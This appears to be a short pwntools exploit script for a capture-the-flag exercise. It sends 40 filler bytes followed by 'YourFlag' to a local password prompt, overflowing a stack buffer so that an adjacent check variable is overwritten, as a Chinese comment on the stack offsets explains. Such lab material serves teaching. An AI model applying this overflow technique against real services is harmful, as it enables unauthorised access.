#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
HOST = os.environ.get('HOST', '127.0.0.1')
PORT = int(os.environ.get('PORT', '9101'))

context(arch='amd64', os='linux', log_level='info')

p = remote(HOST, PORT)
p.recvuntil(b'password:')
# buf[32] 在 rbp-0x30，check[8] 在 rbp-8：距 buf 起点 0x28 = 40 字节
p.sendline(b'A' * 40 + b'YourFlag')
print(p.recvall(timeout=3).decode(errors='replace'))
